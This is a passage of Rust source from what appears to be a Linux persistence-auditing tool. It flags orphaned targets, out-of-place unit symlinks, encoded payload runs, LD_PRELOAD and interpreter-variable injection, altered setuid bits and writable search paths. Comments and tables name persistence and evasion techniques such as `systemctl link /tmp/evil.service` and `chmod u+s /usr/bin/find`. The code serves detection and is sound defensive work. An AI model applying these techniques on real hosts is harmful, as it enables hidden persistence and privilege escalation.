    let first = lines.first()?.first()?.trim_start_matches(['-', '@', '+', '!', ':']);
    if first.is_empty() || first.contains('/') {
        return None;
    }
    // udev resolves its helper names against its own directory, which is why
    // `IMPORT{program}=ata_id` appears bare in dozens of vendor rules.
    let extra: &[&str] = match kind {
        Kind::Udev => &["usr/lib/udev", "lib/udev"],
        _ => &[],
    };
    extra
        .iter()
        .chain(BIN_DIRS.iter())
        .map(|d| format!("{d}/{first}"))
        .find(|p| root.exists(p))
        .map(|p| root.abs(p))
}

/// Why a target path cannot be checked against the filesystem at all.
fn unverifiable(target: &Path) -> Option<&'static str> {
    let text = target.to_string_lossy();
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        // A systemd specifier: %i, %f, %H. `%%` is a literal percent.
        if c == '%' {
            match chars.peek() {
                Some('%') => {
                    chars.next();
                }
                Some(n) if n.is_ascii_alphabetic() => return Some("unexpanded specifier"),
                _ => {}
            }
        }
    }
    if text.contains(['*', '?']) || (text.contains('[') && text.contains(']')) {
        return Some("glob pattern");
    }
    None
}

/// The reported digest, and whether the thing the entry runs is actually
/// there. An entry pointing at a path that does not exist is Autoruns' orphan
/// highlighting: cheap to check, impossible to fake.
fn apply_target(root: &Root, entry: &mut Entry) {
    let hashed = match &entry.target_path {
        Some(target) => {
            // A path holding a specifier or a glob names a set, not a file.
            // Reporting it missing would be a false finding on every
            // template unit and every sshd Include line.
            if let Some(why) = unverifiable(target) {
                entry.note("target_unverifiable", why);
                return;
            }
            let rel = root.rel(target);
            if !root.exists(&rel) {
                // Absent, but tested for before it would run: a script's
                // `[ -x ]` around it, or the unit's own Condition on it.
                // The script or unit is written for a host without it.
                let guard = entry.raw.get("guarded_by_test").cloned().or_else(|| {
                    entry.raw.get("condition_fails")?.split("; ").find(|c| {
                        c.split_once('=').is_some_and(|(_, v)| root.rel(Path::new(v.trim_start_matches(['|', '!']))) == rel)
                    }).map(|c| c.to_string())
                });
                match guard {
                    Some(how) => entry.note("target_provenance", format!("absent, guarded by {how}")),
                    None => entry.flag(Flag::TargetMissing),
                }
            }
            rel
        }
        None => {
            // No resolvable target. Where the entry is itself the script,
            // the source is what runs; where a command was parsed but no
            // path could be got out of it, that is a finding of its own —
            // unless the mechanism runs it inside its own process, as udev
            // does with its builtins, in which case there is no file to find.
            // A collector that already knows there is no path to find says
            // so, and is believed: a udev rule naming a systemd unit, or one
            // whose action runs inside udev itself, has no file to resolve.
            if entry.raw.get("key").is_some_and(|k| k.contains("{builtin}")) {
                entry.note("target_unverifiable", "runs inside udev, not a program");
            } else if entry.command.is_some() && !entry.raw.contains_key("target_unverifiable") {
                entry.flag(Flag::TargetUnresolvable);
            }
            root.rel(&entry.source)
        }
    };

    if entry.target_sha256.is_none() {
        match provenance::digests(root, &hashed) {
            Some(d) => entry.target_sha256 = Some(d.sha256),
            None if root.stat_follow(&hashed).is_ok_and(|m| m.is_file && m.size > provenance::HASH_SIZE_LIMIT) => {
                entry.note("digest_skipped", format!("the file is larger than {} MiB", provenance::HASH_SIZE_LIMIT >> 20));
            }
            None => {}
        }
    }
    // A zero-byte file holds no mechanism: /etc/environment as most hosts
    // ship it. Only where the file is what the entry is about — it is the
    // target, or there is none — since an empty crontab line would not get
    // here at all.
    let about_itself = entry.target_path.as_ref().is_none_or(|t| root.rel(t) == root.rel(&entry.source));
    if about_itself && root.stat_follow(&hashed).is_ok_and(|m| m.is_file && m.size == 0) {
        entry.note("empty_file", "true");
    }
}

/// Where a mechanism's files are supposed to live. A unit or rule outside its
/// own search path — usually reached by a symlink from inside one — is worth
/// saying out loud.
fn standard_roots(kind: Kind) -> &'static [&'static str] {
    match kind {
        Kind::SystemdUnit | Kind::SystemdTimer | Kind::SystemdGenerator => &[
            "/etc/systemd/",
            "/etc/xdg/systemd/user/",
            "/run/systemd/",
            "/usr/lib/systemd/",
            "/lib/systemd/",
            "/usr/local/lib/systemd/",
            "/usr/share/systemd/user/",
            "/usr/local/share/systemd/user/",
        ],
        Kind::Udev => &["/etc/udev/", "/run/udev/", "/usr/local/lib/udev/", "/usr/lib/udev/", "/lib/udev/"],
        Kind::KernelModule => &[
            "/etc/modules",
            "/etc/modules-load.d/",
            "/etc/modprobe.d/",
            "/run/modules-load.d/",
            "/run/modprobe.d/",
            "/usr/local/lib/modules-load.d/",
            "/usr/local/lib/modprobe.d/",
            "/usr/lib/modprobe.d/",
            "/lib/modprobe.d/",
            "/usr/lib/modules-load.d/",
            "/lib/modules-load.d/",
            "/proc/modules",
        ],
        // ponytail: a prefix, since the session directories are globbed;
        // /etc/xdg/xdg-*/ is root's to write either way.
        Kind::XdgAutostart => &[
            "/etc/xdg/autostart/",
            "/etc/xdg/xdg-",
            // gnome-session's and mate-session's data-directory autostart,
            // and the scripts gsd-xsettings runs when Xwayland starts.
            "/usr/share/gnome/autostart/",
            "/usr/local/share/gnome/autostart/",
            "/usr/share/mate/autostart/",
            "/usr/local/share/mate/autostart/",
            "/etc/xdg/Xwayland-session.d/",
        ],
        Kind::Tmpfiles => &[
            "/etc/tmpfiles.d/",
            "/run/tmpfiles.d/",
            "/usr/local/lib/tmpfiles.d/",
            "/usr/lib/tmpfiles.d/",
            "/lib/tmpfiles.d/",
            "/usr/local/share/user-tmpfiles.d/",
            "/usr/share/user-tmpfiles.d/",
        ],
        Kind::SystemdPreset => {
            &["/etc/systemd/", "/run/systemd/", "/usr/local/lib/systemd/", "/usr/lib/systemd/", "/lib/systemd/"]
        }
        Kind::Cron => &["/etc/crontab", "/etc/cron", "/etc/anacrontab", "/var/spool/cron"],
        _ => &[],
    }
}

fn apply_location(root: &Root, entry: &mut Entry) {
    let roots = standard_roots(entry.kind);
    if roots.is_empty() {
        return;
    }
    // Per-user autostart lives under each home, so the acceptable prefixes
    // are built from the homes actually found rather than matched loosely.
    let mut acceptable: Vec<String> = roots.iter().map(|r| (*r).to_string()).collect();
    let per_home: &[&str] = match entry.kind {
        Kind::XdgAutostart => &[".config/autostart/", ".config/autostart-scripts/", ".config/plasma-workspace/"],
        Kind::Tmpfiles => &[".config/user-tmpfiles.d/", ".local/share/user-tmpfiles.d/"],
        // The per-account half of the user manager's search path.
        Kind::SystemdUnit | Kind::SystemdTimer => {
            &[".config/systemd/user/", ".config/systemd/user.control/", ".local/share/systemd/user/"]
        }
        _ => &[],
    };
    for home in root.homes() {
        for sub in per_home {
            acceptable.push(format!("{}/{sub}", Path::new("/").join(root.rel(home)).display()));
        }
    }
    // A prefix test, not a substring one. `contains` let an attacker keep the
    // flag off by staging under any directory whose name happened to hold the
    // search path — /home/alice/etc/systemd/evil.service passed it.
    let inside = |p: &Path| {
        let text = p.to_string_lossy().into_owned();
        acceptable.iter().any(|r| text.starts_with(r.as_str()))
    };
    // Paths are judged as they sit inside the scan root, so an offline image
    // does not inherit the analyst's own directory names.
    let in_root = |p: &Path| Path::new("/").join(root.rel(p));

    // The source is always inside a search path, because that is where the
    // collector looked. What matters is where a symlink from inside one
    // actually leads: `systemctl link /tmp/evil.service` leaves a perfectly
    // ordinary-looking unit name in /etc.
    if let Some(target) = entry.raw.get("symlink_target") {
        // Masking is a link to /dev/null. That is the documented way to turn
        // a unit off, not a mechanism hiding outside its search path.
        if target == "/dev/null" {
            return;
        }
        let resolved = in_root(&resolve_link(root, &entry.source, Path::new(target)));
        // A link into a vendor tree is how a package installs a generator or
        // a unit under another name: netplan's generator is a link to
        // /usr/libexec/netplan/generate. The escape worth a flag is into a
        // place packages do not own — /tmp, a home, /opt, /var.
        const VENDOR_TREES: [&str; 10] = [
            "/usr/lib/", "/usr/lib64/", "/usr/libexec/", "/usr/bin/", "/usr/sbin/", "/usr/share/", "/lib/", "/lib64/", "/bin/",
            "/sbin/",
        ];
        let vendor = VENDOR_TREES.iter().any(|v| resolved.to_string_lossy().starts_with(v));
        if !inside(&resolved) && !vendor {
            entry.flag(Flag::NonStandardLocation);
        }
        if is_hidden_path(&resolved) {
            entry.flag(Flag::HiddenPath);
        }
    } else if !inside(&in_root(&entry.source)) {
        entry.flag(Flag::NonStandardLocation);
    }
}

fn resolve_link(root: &Root, source: &Path, target: &Path) -> PathBuf {
    if target.is_absolute() {
        return root.abs(root.rel(target));
    }
    match source.parent() {
        Some(dir) => root.abs(root.rel(&dir.join(target))),
        None => target.to_path_buf(),
    }
}

/// Where a run of encoding characters stops being something an ordinary
/// command carries. Measured, not chosen. Across the 913 commands collected
/// from this host and five distribution roots (Debian 12 and 13, Ubuntu
/// 24.04, Fedora 43, AlmaLinux 9), and every Exec=, ExecStart= and udev RUN
/// line in 1,624 unit, desktop, rule and cron files, the longest base64-
/// alphabet run was 38 — `LVM_SUPPRESS_LOCKING_FAILURE_MESSAGES=` — and the
/// longest hex run was 40, a sha1 directory name inside a Wine launcher's
/// Exec line. Above those sit fixed-length families a scan will meet on a
/// host that was not measured: a 32-character nix store hash or a GUID with
/// its dashes stripped, and the 44 characters a sha256 takes in base64.
///
/// The hex ceiling is far higher because digests are ordinary. A sha256 is 64
/// hex characters and a sha512 is 128, and both are written out in commands
/// that are doing their job: `--hash=sha256:...`, a verity root hash, a
/// container id, a machine id. A hex threshold at or below 128 reports those,
/// and a flag that fires on them is worse than no flag at all.
const BASE64_RUN: usize = 48;
const HEX_RUN: usize = 160;

/// The longest run of encoding characters in a command that reaches its
/// alphabet's threshold: offset, length, and which alphabet.
///
/// `/` and `-` end a run although both are encoding characters, because every
/// long run containing them on a real host was a path or a hyphenated name:
/// `/usr/lib/systemd/system-generators/systemd-hibernate-resume-generator` is
/// a single 69-character run otherwise, and so is every UUID. What that costs
/// is symmetric and small — standard base64 is then broken only by `/` and
/// URL-safe base64 only by `-`, about one character in 64 either way — so a
/// payload is chopped into pieces rather than hidden: a 128-byte random
/// payload still leaves a 48-character run 97% of the time, and base64 of
/// text, which is what a shell dropper carries, is usually not broken at all.
///
/// A run drawn entirely from the hex alphabet is judged as hex even though it
/// is also valid base64. That is what keeps a sha256 out of the report.
fn encoded_run(command: &[u8]) -> Option<(usize, usize, &'static str)> {
    let is_core = |b: u8| b.is_ascii_alphanumeric() || b == b'+' || b == b'_';
    let mut best: Option<(usize, usize, &'static str)> = None;
    let mut i = 0;
    while i < command.len() {
        if !is_core(command[i]) {
            i += 1;
            continue;
        }
        let start = i;
        while i < command.len() && is_core(command[i]) {
            i += 1;
        }
        let body = i - start;
        // `=` counts as base64 padding and only as padding; taken as an
        // ordinary run character it would join a variable's name to its value
        // and report the pair as one long run.
        while i < command.len() && command[i] == b'=' && i - start < body + 2 {
            i += 1;
        }
        let len = i - start;
        let hex = len == body && command[start..i].iter().all(u8::is_ascii_hexdigit);
        let (threshold, alphabet) = if hex { (HEX_RUN, "hex") } else { (BASE64_RUN, "base64") };
        if len >= threshold && len > best.map_or(0, |(_, seen, _)| seen) {
            best = Some((start, len, alphabet));
        }
    }
    best
}

/// The second half of §8's EncodingAnomaly — the first being the non-UTF-8
/// bytes each collector already reports. It lives here rather than in the
/// collectors so that one threshold, derived from one measurement, governs
/// every mechanism class.
///
/// `Kind::SshAuthorizedKey` is deliberately not exempt. Its key material
/// never reaches `command`: the collector puts the blob's fingerprint in the
/// entry name and the options in `raw`, and sets `command` only from a
/// `command="..."` forced command or an `AuthorizedKeysCommand` directive.
/// Exempting the kind would blind the flag on the one field of that entry
/// that really is a command, and a forced command is where an attacker who
/// already has a key line puts a payload.
fn apply_encoding(entry: &mut Entry) {
    // Bytes that are not text in a command, a target or the path of the file
    // are evidence in themselves. Decided here from the entry, once, rather
    // than as something each collector has to remember to say.
    let not_text = entry.command.as_deref().is_some_and(|c| std::str::from_utf8(c).is_err())
        || entry.target_path.as_ref().is_some_and(|p| p.to_str().is_none())
        || entry.source.to_str().is_none();
    if not_text {
        entry.flag(Flag::EncodingAnomaly);
    }
    let Some(command) = &entry.command else { return };
    let Some((offset, len, alphabet)) = encoded_run(command) else { return };
    entry.flag(Flag::EncodingAnomaly);
    // Where the run is and how long it is, never the run itself and never a
    // decode of it: §14.2 keeps scan output safe to paste into a ticket, and
    // decoding would be a claim about what the bytes mean rather than a
    // report of what they are. `explain <id>` re-reads the file for anyone
    // who wants to look.
    entry.note("encoded_run", format!("{alphabet}, {len} chars at offset {offset}"));
}

/// A repository can install only what the keys it trusts have signed. Where
/// signature checking is on and every one of those key files is packaged and
/// intact, the repository adds nothing a package did not already vouch for,
/// however its own sources file came to be written (an installer writes the
/// distribution's). Noted, for the default view to judge by.
fn vouch_for_sources(entries: &mut [Entry]) {
    let verified: BTreeMap<String, bool> = entries
        .iter()
        .filter(|e| e.kind == Kind::PkgSource && e.name.starts_with("key:"))
        .map(|e| (e.source.to_string_lossy().into_owned(), e.provenance.is_verified()))
        .collect();
    for e in entries.iter_mut() {
        if e.kind != Kind::PkgSource || e.raw.contains_key("signature_checking") {
            continue;
        }
        let Some(trusts) = e.raw.get("trusts") else { continue };
        let all = trusts.split(", ").all(|k| verified.get(k).copied().unwrap_or(false));
        if all {
            e.note("vouched", "every key it trusts is packaged and intact");
        }
    }
}

/// A line found verbatim in a packaged, intact template — sysvinit-core's
/// postinst copies /usr/share/sysvinit/inittab to /etc/inittab, so dpkg owns
/// the template and never the file — is what the package wrote, however the
/// file it sits in came to be. Noted, for the default view to judge by.
fn vouch_for_templates(root: &Root, entries: &mut [Entry], answers: &provenance::Answers) {
    for e in entries.iter_mut() {
        let Some(template) = e.raw.get("matches_template") else { continue };
        // Noted in the scan root's coordinates, which on an offline root carry
        // the mount prefix the answers are keyed without.
        let rel = root.rel(Path::new(template));
        if answers.get(&rel).is_some_and(Provenance::is_verified) {
            e.note("vouched", "a line of the packaged template, unchanged");
        }
    }
}

/// The unit names and init scripts each super-server daemon is started by.
const SUPER_SERVERS: [(&str, &[&str], &[&str]); 2] = [
    ("xinetd", &["xinetd.service"], &["xinetd"]),
    (
        "inetd",
        &["inetd.service", "openbsd-inetd.service", "inetutils-inetd.service"],
        &["inetd", "openbsd-inetd", "inetutils-inetd"],
    ),
];

/// A service xinetd or inetd would start runs only while that daemon does.
/// Its systemd unit decides, where there is one: a native unit replaces an
/// init script of the same name. Otherwise the init script's rc links do.
/// Where neither is found the service keeps its own setting, noted.
fn gate_on_super_server(entries: &mut [Entry]) {
    for (daemon, units, scripts) in SUPER_SERVERS {
        let state = |kind: Kind, names: &[&str]| -> Option<Enablement> {
            let found: Vec<Enablement> =
                entries.iter().filter(|e| e.kind == kind && names.contains(&e.name.as_str())).map(|e| e.enabled).collect();
            if found.is_empty() {
                return None;
            }
            Some(if found.iter().any(|s| matches!(s, Enablement::Enabled | Enablement::Static)) {
                Enablement::Enabled
            } else if found.contains(&Enablement::Unknown) {
                Enablement::Unknown
            } else {
                Enablement::Disabled
            })
        };
        let (daemon_state, by) = match (state(Kind::SystemdUnit, units), state(Kind::SysvInit, scripts)) {
            (Some(s), _) => (Some(s), "systemd unit"),
            (None, Some(s)) => (Some(s), "init script"),
            (None, None) => (None, ""),
        };
        for e in entries.iter_mut() {
            if e.kind != Kind::InetdService || e.raw.get("daemon").map(String::as_str) != Some(daemon) {
                continue;
            }
            match daemon_state {
                None => e.note("daemon_state", format!("no unit or init script for {daemon} found")),
                Some(s) => {
                    e.note("daemon_state", format!("{daemon} {by} {s}"));
                    if e.enabled == Enablement::Enabled && s != Enablement::Enabled {
                        // What the collector read is kept, as the bus answer
                        // keeps it, so the override can be told from the file.
                        e.note("inferred_enablement", e.enabled.as_str());
                        e.enabled = s;
                    }
                }
            }
        }
    }
}

/// Collectors record which file shadows which; deciding that the relationship
/// is worth a flag needs the whole set, so it happens here.
fn apply_shadowing(entries: &mut [Entry]) {
    for e in entries {
        if e.raw.contains_key("shadows") {
            e.flag(Flag::ShadowsVendorUnit);
        }
    }
}

/// A cron job or unit whose target is an unpackaged setuid binary is a
/// different proposition from one that merely runs an unpackaged script. The
/// fact needs two collectors, so it is recorded here.
fn cross_reference_suid(entries: &mut [Entry]) {
    let suspicious: BTreeSet<PathBuf> = entries
        .iter()
        .filter(|e| e.kind == Kind::SuidBinary && matches!(e.provenance, Provenance::Unpackaged))
        .map(|e| e.source.clone())
        .collect();
    if suspicious.is_empty() {
        return;
    }
    for e in entries {
        if e.kind == Kind::SuidBinary {
            continue;
        }
        if let Some(target) = &e.target_path {
            if suspicious.contains(target) {
                e.note("target_is_unpackaged_suid", "true");
            }
        }
    }
}

/// §5 promises an ld_preload entry for every LD_PRELOAD assignment found by
/// the shell and systemd collectors, and §14.4 forbids a collector from
/// knowing about another's output. Both hold if the collectors record the
/// assignment as ordinary data and the entries are made here — which also
/// catches the assignments in PAM environment files, crontabs and udev rules
/// that neither section thought to list.
fn preload_entries(root: &Root, entries: &[Entry]) -> Vec<Entry> {
    let mut out = Vec::new();
    let mut seen: BTreeSet<(PathBuf, String)> = BTreeSet::new();

    for carrier in entries {
        if carrier.kind == Kind::LdPreload {
            continue;
        }
        for (key, value) in &carrier.raw {
            if !matches!(key.as_str(), "env.LD_PRELOAD" | "env.LD_AUDIT" | "env.LD_LIBRARY_PATH") {
                continue;
            }
            let variable = key.trim_start_matches("env.");
            for library in value.split([' ', ':', '\n']).filter(|s| !s.is_empty()) {
                if !seen.insert((carrier.source.clone(), library.to_string())) {
                    continue;
                }
                let mut e = made_from(root, carrier, Kind::LdPreload, library, false);
                e.command = Some(format!("{variable}={library}").into_bytes());
                e.target_path = Some(root.abs(root.rel(Path::new(library))));
                e.note("variable", variable);
                e.note("declared_in", carrier.source.to_string_lossy());
                out.push(e);
            }
        }
    }
    out
}

/// Variables that make an interpreter run or load code of their choosing
/// before its own: what reads each, and when.
const INTERPRETER_VARS: [(&str, &str); 12] = [
    ("PERL5OPT", "every perl, as command-line switches (-M loads a module)"),
    ("PERL5LIB", "every perl, ahead of its own module directories"),
    ("RUBYOPT", "every ruby, as options (-r loads a library)"),
    ("RUBYLIB", "every ruby, ahead of its own library directories"),
    ("NODE_OPTIONS", "every node, as options (--require and --import load a module)"),
    ("JAVA_TOOL_OPTIONS", "every JVM, as options (-javaagent loads a jar)"),
    ("_JAVA_OPTIONS", "every HotSpot JVM, as options"),
    ("PYTHONPATH", "every python, ahead of its own module directories"),
    ("PYTHONSTARTUP", "every interactive python, which runs the file"),
    ("BASH_ENV", "every non-interactive bash, a script included, which sources the file"),
    ("ENV", "every interactive sh and ksh, which source the file"),
    ("PROMPT_COMMAND", "every interactive bash, before each prompt"),
];

/// One entry per interpreter variable an entry sets: the file that sets it
/// is where its code comes from, whatever it names. Where the value names a
/// file to run or load, that file is the target.
fn interpreter_entries(root: &Root, entries: &[Entry]) -> Vec<Entry> {
    let mut out = Vec::new();
    for carrier in entries {
        if carrier.kind == Kind::InterpreterEnv {
            continue;
        }
        for (variable, reads) in INTERPRETER_VARS {
            let Some(value) = carrier.raw.get(&format!("env.{variable}")) else { continue };
            if value.is_empty() {
                continue;
            }
            let mut e = made_from(root, carrier, Kind::InterpreterEnv, variable, false);
            e.command = Some(format!("{variable}={value}").into_bytes());
            let file = match variable {
                "BASH_ENV" | "ENV" | "PYTHONSTARTUP" => Some(value.as_str()),
                "JAVA_TOOL_OPTIONS" | "_JAVA_OPTIONS" => value.split_whitespace().find_map(|w| w.strip_prefix("-javaagent:")).map(|a| a.split('=').next().unwrap_or(a)),
                "NODE_OPTIONS" => {
                    let words: Vec<&str> = value.split_whitespace().collect();
                    words.windows(2).find(|w| matches!(w[0], "--require" | "-r" | "--import")).map(|w| w[1])
                }
                _ => None,
            };
            // Judged by the file it names; with none, by the file that sets it,
            // which is its own source.
            if let Some(f) = file.filter(|f| f.starts_with('/')) {
                e.target_path = Some(root.abs(root.rel(Path::new(f))));
            }
            // What the variable holds is code or options, not a command line.
            e.note("target_unverifiable", "a variable an interpreter reads");
            e.note("variable", variable);
            e.note("read_by", reads);
            e.note("declared_in", carrier.source.to_string_lossy());
            out.push(e);
        }
    }
    out
}

/// dpkg records no file modes, so a setuid bit added to a packaged binary
/// leaves its digest intact: `chmod u+s /usr/bin/find` verifies clean. What
/// dpkg does leave is when it installed the package, as its `.list` file's
/// change time, and chmod moves the file's. A setuid or setgid file whose
/// inode changed well after its package was installed is noted, unless
/// dpkg-statoverride recorded the mode, which is the sanctioned way to set
/// one. Live roots only: on a copied image every change time is the copy's.
/// rpm records modes and is checked exactly, in provenance.
fn setuid_changed_after_install(root: &Root, e: &mut Entry) {
    if e.kind != Kind::SuidBinary || !root.is_live() {
        return;
    }
    let Provenance::Packaged { package, .. } = &e.provenance else { return };
    let rel = root.rel(&e.source);
    let Ok(file) = root.stat(&rel) else { return };
    if file.mode & 0o6000 == 0 {
        return;
    }
    let Some((list, installed)) = crate::provenance::dpkg::list_written(root, package) else { return };
    let Some(changed) = file.ctime else { return };
    let Some(after) = crate::provenance::dpkg::changed_after_install(changed, installed) else { return };
    if !crate::provenance::dpkg::statoverridden(root, &rel) {
        e.note("changed_after_install", format!("inode changed {}s after {list} was written", after.as_secs()));
    }
}

/// A PATH value split where the shell splits it: at colons outside `${...}`,
/// whose own colons, as in `${PATH:+$PATH:}`, belong to the expansion.
fn path_components(path: &str) -> Vec<String> {
    let mut out = vec![String::new()];
    let mut depth = 0usize;
    let mut chars = path.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '$' if chars.peek() == Some(&'{') => depth += 1,
            '}' if depth > 0 => depth -= 1,
            ':' if depth == 0 => {
                out.push(String::new());
                continue;
            }
            _ => {}
        }
        if let Some(last) = out.last_mut() {
            last.push(c);
        }
    }
    out
}

/// A search path naming a directory that an account the declaring file does
/// not already trust can write: whoever can put a file there chooses what a
/// bare command name, or a library soname, resolves to. Trusted are root and
/// the owner of the file that sets the path, who could edit the path itself,
/// so `~/bin` in a user's own profile is not a finding and `/tmp` anywhere
/// is. A relative component, `.` or an empty one, searches the current
/// directory, which is the same thing. A component the shell would have to
/// expand is left alone rather than guessed at.
fn writable_search_path(root: &Root, e: &mut Entry) {
    let dirs: Vec<String> = match (e.kind, e.raw.get("env.PATH")) {
        (Kind::LibraryDir, _) => vec![e.name.clone()],
        (_, Some(path)) => path_components(path),
        _ => return,
    };
    let mut found = Vec::new();
    for d in &dirs {
        if d.contains('$') || d.starts_with('~') {
            continue;
        }
        if !d.starts_with('/') {
            let shown = if d.is_empty() { "an empty entry" } else { d.as_str() };
            found.push(format!("{shown} (relative: the current directory)"));
            continue;
        }
        let Ok(m) = root.stat_follow(root.rel(Path::new(d))) else { continue };
        if !m.is_dir {
            continue;
        }
        let why = if m.mode & 0o002 != 0 {
            "world-writable".to_string()
        } else if m.mode & 0o020 != 0 && m.gid != 0 {
            format!("writable by group {}", m.gid)
        } else if m.uid != 0 && m.uid != e.owner_uid {
            format!("owned by uid {}", m.uid)
        } else {
            continue;
        };
        found.push(format!("{d} ({why})"));
    }
    if !found.is_empty() {
        e.flag(Flag::WritableSearchPath);
        e.note("writable_search_path", found.join("; "));
    }
}

// -------------------------------------------------- the interpreter chain ----

/// Bytes read from a referenced script. The shebang is the first line; the
/// rest is the window in which a second file the script hands control to is
/// still the obvious next link rather than a guess about control flow.
const SCRIPT_HEAD: usize = 8 * 1024;

/// §5's third deep finding — "scripts referenced by entries but living
/// outside any package" — reduced to the part nothing else answers. An
/// entry's own target is resolved above: a cron job running an unpackaged
/// script already reports `Unpackaged` and a `target_provenance` note. The
/// link after that one is unreported. A script can be packaged, unmodified
/// and still name `/opt/python3.11/bin/python` in its shebang, or source a
/// second file out of /tmp; the executable an entry points at is only the
/// first hop, and `target_path` here is the next one so that the pass above
/// resolves its provenance too.
///
/// It is enrichment rather than a collector because "referenced by entries"
/// is exactly the relation §14.4 forbids a collector from seeing. Nothing is
/// traversed — every file read here was already named by an entry — so the
/// `--deep` gate §5 puts on this finding buys nothing and is not applied.
///
/// One hop, and only where the path is written out in full. A `source
/// "$DIR/x"`, a relative interpreter, or anything else the shell would have
/// to expand is left alone rather than guessed at, and nothing recurses: the
/// entries this emits are not themselves followed.
fn interpreter_chain(root: &Root, entries: &[Entry]) -> Vec<Entry> {
    use std::os::unix::ffi::OsStrExt;

    let mut out = Vec::new();
    // Keyed on the entry id's own inputs, so that two entries reaching one
    // script — an init script and the rc2.d symlink enabling it — cannot
    // produce the same id twice.
    let mut seen: BTreeSet<(Kind, PathBuf, String)> = BTreeSet::new();
    let mut seen_declared: BTreeSet<(String, String)> = BTreeSet::new();

    for carrier in entries {
        let script = match &carrier.target_path {
            Some(target) => root.rel(target),
            None => root.rel(&carrier.source),
        };
        // Stat before opening: a named pipe where a script is expected would
        // block this pass forever, and a directory or device node is not a
        // script. Resolving the link is deliberate, because the kernel reads
        // the shebang of whatever the link points at, and the root handle
        // keeps that resolution inside the scan root.
        if !matches!(root.stat_follow(&script), Ok(m) if m.is_file) {
            continue;
        }
        let Ok((head, _)) = root.read_capped(&script, SCRIPT_HEAD) else { continue };
        // No shebang, no script. It also keeps this off the ELF binaries most
        // entries point at, where bytes that read like `exec /tmp/x` are a
        // coincidence of the file's data rather than a command. The one
        // exception is a Python module a mechanism imports rather than runs,
        // a dnf or yum plugin: it has no shebang and needs none.
        let module = script.extension().is_some_and(|x| x == "py");
        let mut links: Vec<(&str, Vec<u8>)> = Vec::new();
        let python = match head.strip_prefix(b"#!") {
            Some(after) => {
                let first = &after[..after.iter().position(|b| *b == b'\n').unwrap_or(after.len())];
                let interpreter = interpreter_of(first);
                let python = interpreter.as_deref().is_some_and(|i| {
                    Path::new(std::ffi::OsStr::from_bytes(i))
                        .file_name()
                        .is_some_and(|n| n.as_bytes().starts_with(b"python"))
                });
                links.extend(interpreter.map(|i| ("shebang", i)));
                links.extend(handed_off(&head));
                python
            }
            None if module => true,
            None => continue,
        };
        if python || module {
            links.extend(python_launches(root, carrier.kind, &head));
        }

        for (via, referenced) in links {
            let name = String::from_utf8_lossy(&referenced).into_owned();
            // A Python launch is keyed by the entry it came from, like a
            // command in shell text. The shebang chain keeps the key it has
            // always had, so its ids still match baselines taken before.
            let fresh = if via == "python" {
                seen_declared.insert((carrier.id.clone(), name.clone()))
            } else {
                seen.insert((carrier.kind, carrier.source.clone(), name.clone()))
            };
            if !fresh {
                continue;
            }
            // The kind and source are the carrier's: the mechanism that makes
            // this code run is still cron or systemd, and the file the fact
            // hangs off is the one whose own location and ownership the
            // operator is already being shown.
            let mut e = made_from(root, carrier, carrier.kind, &name, via == "python");
            let path = Path::new(std::ffi::OsStr::from_bytes(&referenced));
            // Sourcing a file that is not there runs nothing, and init
            // scripts routinely source optional defaults after testing for
            // them. A missing interpreter or exec target is a broken
            // hand-off and is still reported.
            if via == "source" && !root.exists(root.rel(path)) {
                continue;
            }
            if path.is_absolute() {
                e.target_path = Some(root.abs(root.rel(path)));
            } else if let Some(found) = resolve_bare_command(root, carrier.kind, &referenced) {
                // `#!/usr/bin/env python3` names env; the interpreter is the
                // argument, and which python3 answers is a question about the
                // search path — the same question a bare ExecStart asks.
                e.note("target_resolved_from", "search path");
                e.target_path = Some(found);
            }
            if std::str::from_utf8(&referenced).is_err() {
                e.flag(Flag::EncodingAnomaly);
                e.note("referenced_raw_hex", crate::entry::hex(&referenced));
            }
            e.command = Some(referenced);
            e.note("chain", via);
            e.note("chain_from", root.abs(&script).to_string_lossy());
            if let Some(how) = guarded_by_test(&head, e.command.as_deref().unwrap_or(b"")) {
                e.note("guarded_by_test", how);
            }
            out.push(e);
        }
    }
    out
}

/// The program a shebang line actually starts. `#!/usr/bin/env python3`
/// starts python3 rather than env, and env's own options and `KEY=VALUE`
/// arguments come between the two.
fn interpreter_of(line: &[u8]) -> Option<Vec<u8>> {
    use std::os::unix::ffi::OsStrExt;

    let mut words = line.split(|b: &u8| b.is_ascii_whitespace()).filter(|w| !w.is_empty());
    let first = words.next()?;
    if Path::new(std::ffi::OsStr::from_bytes(first)).file_name() != Some(std::ffi::OsStr::new("env"))
    {
        return Some(first.to_vec());
    }
    Some(words.find(|w| w[0] != b'-' && !w.contains(&b'=')).unwrap_or(first).to_vec())
}

/// Programs a Python file starts: the literal first argument of a call that
/// launches a process. `os.system` and `os.popen` take shell text, which is
/// split the way the shell would; `subprocess` takes a program or, given
/// `shell=True`, shell text; the `os.exec` and `os.spawn` families take a
/// program. An argument built at run time is not followed, because this pass
/// does not run Python.
fn python_launches(root: &Root, kind: Kind, source: &[u8]) -> Vec<(&'static str, Vec<u8>)> {
    const SHELL_TEXT: &[&str] = &["os.system(", "os.popen(", "subprocess.getoutput(", "subprocess.getstatusoutput("];
    const PROGRAM: &[&str] = &[
        "subprocess.run(", "subprocess.call(", "subprocess.Popen(", "subprocess.check_call(",
        "subprocess.check_output(", "os.execv(", "os.execve(", "os.execl(", "os.execle(", "os.execlp(",
        "os.execvp(", "os.execvpe(", "os.spawnv(", "os.spawnl(",
    ];
    let text = String::from_utf8_lossy(source);
    let mut out = Vec::new();
    for line in text.lines() {
        let code = line.trim_start();
        if code.starts_with('#') {
            continue;
        }
        let calls = SHELL_TEXT.iter().map(|c| (c, true)).chain(PROGRAM.iter().map(|c| (c, false)));
        for (call, shell_text) in calls {
            let Some(at) = code.find(*call) else { continue };
            let args = &code[at + call.len()..];
            // os.spawn* take a mode before the program.
            let args = if call.starts_with("os.spawn") { args.split_once(',').map_or("", |(_, r)| r) } else { args };
            let listed = args.trim_start().starts_with('[');
            let Some(literal) = python_string(args.trim_start().trim_start_matches('[')) else { continue };
            let shell = shell_text || (!listed && args.contains("shell=True"));
            let mut runs = Vec::new();
            if shell {
                for c in commands(&literal, 0) {
                    programs(c, Vec::new(), 0, &mut runs);
                }
            } else {
                runs.push(Run { by: Vec::new(), program: Some(literal.clone()), words: vec![literal] });
            }
            for run in runs {
                let Some(program) = run.program else { continue };
                if program.starts_with('/') || program_path(root, kind, &program).is_some() {
